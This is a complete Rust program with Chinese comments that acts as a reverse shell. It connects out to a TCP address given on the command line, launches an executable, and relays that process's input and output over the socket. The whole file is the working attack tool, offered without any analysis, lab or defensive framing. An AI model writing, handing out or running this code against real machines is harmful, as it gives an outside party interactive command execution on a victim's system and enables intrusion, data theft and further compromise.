use std::env;
use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::thread;

fn main() {
    // 获取命令行参数
    let args: Vec<String> = env::args().collect();

    if args.len() < 3 {
        println!("Usage: {} <target_ip:port> <executable_path>", args[0]);
        return;
    }

    let target = &args[1];
    let executable_path = &args[2];

    // 尝试连接到目标服务器
    if let Ok(mut stream) = TcpStream::connect(target) {
        println!("Connected to {}", target);

        // 创建一个子进程来运行指定的可执行文件
        let mut child = Command::new(executable_path)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .expect("Failed to start child process");

        // 获取子进程的stdin、stdout和stderr
        let child_stdin = child.stdin.as_mut().unwrap();
        let mut child_stdout = child.stdout.take().unwrap();
        let mut child_stderr = child.stderr.take().unwrap();

        // 创建一个线程来读取子进程的输出并发送到TCP服务器
        let mut stream_clone = stream.try_clone().expect("Failed to clone stream");
        thread::spawn(move || {
            let mut buffer = [0; 1024];
            loop {
                let size = child_stdout.read(&mut buffer).unwrap();
                if size == 0 {
                    break;
                }
                stream_clone.write_all(&buffer[..size]).unwrap();
            }
        });

        // 创建一个线程来读取子进程的错误输出并发送到TCP服务器
        let mut stream_clone = stream.try_clone().expect("Failed to clone stream");
        thread::spawn(move || {
            let mut buffer = [0; 1024];
            loop {
                let size = child_stderr.read(&mut buffer).unwrap();
                if size == 0 {
                    break;
                }
                stream_clone.write_all(&buffer[..size]).unwrap();
            }
        });

        // 从TCP流中读取数据并写入子进程的stdin
        let mut buffer = [0; 1024];
        loop {
            match stream.read(&mut buffer) {
                Ok(size) => {
                    if size == 0 {
                        break;
                    }
                    child_stdin.write_all(&buffer[..size]).unwrap();
                }
                Err(e) => {
                    println!("Error reading from stream: {}", e);
                    break;
                }
            }
        }
    } else {
        println!("Failed to connect to {}", target);
    }
}
